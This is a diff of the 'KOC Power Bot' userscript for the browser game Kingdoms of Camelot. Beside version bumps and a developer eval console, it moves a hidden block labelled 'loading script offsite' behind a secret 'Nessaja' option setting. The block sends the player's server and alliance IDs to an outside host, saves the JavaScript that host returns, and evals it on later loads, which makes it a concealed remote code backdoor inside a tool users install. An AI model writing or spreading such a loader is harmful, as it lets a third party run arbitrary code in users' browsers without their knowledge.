@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name           KOC Power Bot
-// @version        20130415a
+// @version        20130416a
 // @namespace      mat
 // @homepage       http://userscripts.org/scripts/show/101052
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -34,7 +34,7 @@ if(window.self.location != window.top.location){
    }
 }
 
-var Version = '20130415a';
+var Version = '20130416a';
 
 //bandaid to stop loading in advertisements containing the @include urls
 if(document.URL.indexOf('sharethis') != -1) {
@@ -76,7 +76,7 @@ unsafeWindow.arthurCheck = function (a) {
   for (var c = 0; c < a.length; c++) {
     if ($(unescape(a[c]))) {
       b = true;
-      break
+      break;
     }
   }
   if (b) {
@@ -3464,9 +3464,6 @@ show : function (){
       t.ThroneT();
   }, 
 }
-
-//baos780 code for loading script offsite
-if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s);  eval(s);  };  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
 
 /****************************  Tower Tab  ******************************/
@@ -7085,6 +7082,9 @@ elem.setAttribute("style","background: -moz-linear-gradient(center top , #ff0000
   },
 
 }
+
+/***************************** Scripter Tab *******************************/
+
 Tabs.Scripter = {
    tabOrder: 99000,
    tabDisabled : !Options.ScripterTab,
@@ -7092,16 +7092,37 @@ Tabs.Scripter = {
    myDiv : null,
    
    init : function (div) {
+   	
+
+//baos780 code for loading script offsite
+var y = "";
+if(GlobalOptions.Baos) {
+ y=GlobalOptions.Baos;
+};
+   	
       var t = Tabs.Scripter
       t.myDiv = div;
       var m = '<DIV class=pbStat>Scripter</div><br>';
-      m += '<center><INPUT id=SCode type=text size=70 maxlength=9999 value="" \></center>'
+      m += '<table><tr><td></td><td><INPUT id=SCode type=text size=70 maxlength=-1 value="" \></td><td></td></tr>'
+      m += '<tr><td>alert(inspect(</td><td><INPUT id=SaiCode type=text size=70 maxlength=-1 value="" \></td><td>))</td></tr>'
+      m += '</table><INPUT id=Baos780 type=text size=20 maxlength=-1 value='+y+' \>'
       div.innerHTML = m;
       
       document.getElementById('SCode').addEventListener ('keypress', function (e){
       if(e.which == 13)
          eval(this.value);
       }, false);
+      
+      document.getElementById('SaiCode').addEventListener ('keypress', function (e){
+      if(e.which == 13)
+         alert(inspect(eval(this.value)));
+      }, false);      
+      
+      document.getElementById('Baos780').addEventListener ('change', function (){
+         GlobalOptions.Baos = this.value;
+			GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
+      }, false);            
+      
    },
   hide : function (){
     var t = Tabs.Scripter;
@@ -7111,7 +7132,7 @@ Tabs.Scripter = {
     var t = Tabs.Scripter;
   },  
 }
-
+if(GlobalOptions.Baos)if (GlobalOptions.Baos.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s);  eval(s);  };  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
 /*********************************** Test TAB ***********************************/
 Tabs.Test = {
